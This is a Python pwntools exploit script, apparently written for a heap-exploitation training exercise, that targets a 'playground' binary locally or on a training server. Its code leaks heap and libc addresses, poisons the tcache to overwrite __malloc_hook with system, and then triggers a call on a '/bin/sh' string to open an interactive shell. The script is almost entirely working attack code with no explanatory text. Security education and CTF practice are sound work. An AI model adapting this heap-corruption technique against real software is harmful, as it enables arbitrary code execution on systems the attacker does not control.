from pwn import *

# def t_cache_custom_poisoning(r, pointer):


def malloc(r, malloc_size):
    r.recvuntil(b"> ")
    r.sendline(b"malloc %d" % malloc_size)
    r.recvuntil(b"==> ")
    return int(r.recvuntil(b"\n")[:-1], 16)

def free(r, pointer):
    r.recvuntil(b"> ")
    r.sendline(b"free %#x" % pointer)
    r.recvuntil(b"==> ok\n")

def show(r, pointer, n = 1, is_print=False):
    ret = []

    r.recvuntil(b"> ")
    r.sendline(b"show %#x %d" % (pointer, n))
    for i in range(n):
        r.recvuntil(b"%#x:" % (pointer + i * 8))
        ret.append(r.recvuntil(b"\n")[:-1])
        if is_print:
            print(ret[i])
    return ret

def write(r, pointer, content):
    r.recvuntil(b"> ")
    r.sendline(b"write %#x %d" % (pointer , len(content)))
    r.recvuntil(b"==> read")
    r.send(content)
    r.recvuntil(b"==> done")

def main():
    if "REMOTE" not in args:

        r = process("playground")
        gdb.attach(r, """
            # b *0x0804841c
            # c
            set resolve-heap-via-heuristic on
            """)

        input("wait")
    else:
        r = remote("bin.training.jinblack.it", 4010)

    r.recvuntil(b"pid: ")
    pid = int(r.recvuntil(b"\n")[:-1])
    r.recvuntil(b"main: ")
    main_addr = int(r.recvuntil(b"\n")[:-1], 16)
    global_variable_max_heap_offset = 0x2EC7
    global_variable_max_heap = main_addr + global_variable_max_heap_offset
    global_variable_min_heap = global_variable_max_heap + 0x8

    max_heap = int(show(r, global_variable_max_heap, 1)[0], 16)
    min_heap = int(show(r, global_variable_min_heap, 1)[0], 16)

    t_cache_length_ptr = min_heap + 0x10
    t_cache_next_ptr_0x20 = min_heap + 0x50
    t_cache_next_ptr_0xd0 = min_heap + 0xa8

    print("[!] pid: %d" % pid)
    print("[!] main address: %#x" % main_addr)
    print("[!] global variable max heap: %#x" % global_variable_max_heap)
    print("[!] global variable min heap: %#x" % global_variable_min_heap)
    print("[!] max heap: %#x" % max_heap)
    print("[!] min heap: %#x" % min_heap)

    over_t_cache = malloc(r, 0x500)

    bin_sh_ptr = malloc(r, 0x10)
    write(r, bin_sh_ptr, b"/bin/sh\x00")

    free(r,over_t_cache)
    unsorted_bin_ptr = int(show(r, over_t_cache, 1)[0], 16)

    libc_offset = 0x3EBCA0
    libc_base = unsorted_bin_ptr - libc_offset
    malloc_hook_offset = 0x3EBC30
    malloc_hook = libc_base + malloc_hook_offset
    system_offset = 0x4F550
    system = libc_base + system_offset


    print("[!] leak: %#x" % unsorted_bin_ptr)
    print("[!] libc base: %#x" % libc_base)
    print("[!] malloc hook: %#x" % malloc_hook)
    print("[!] system: %#x" % system)

    t_cache_0x20 = malloc(r, 0x10)
    free(r, t_cache_0x20)

    write(r, t_cache_next_ptr_0x20, p64(malloc_hook-0xf))

    malloc(r,0x10)

    write(r, t_cache_length_ptr, p64(0))
    write(r, t_cache_next_ptr_0x20, p64(0))

    a = malloc(r, 0xc0)
    free(r, a)

    write(r, t_cache_next_ptr_0xd0, p64(system))

    free(r, malloc_hook)

    r.recvuntil(b"> ")
    r.sendline(b"malloc %d" % bin_sh_ptr)


    r.interactive()

main()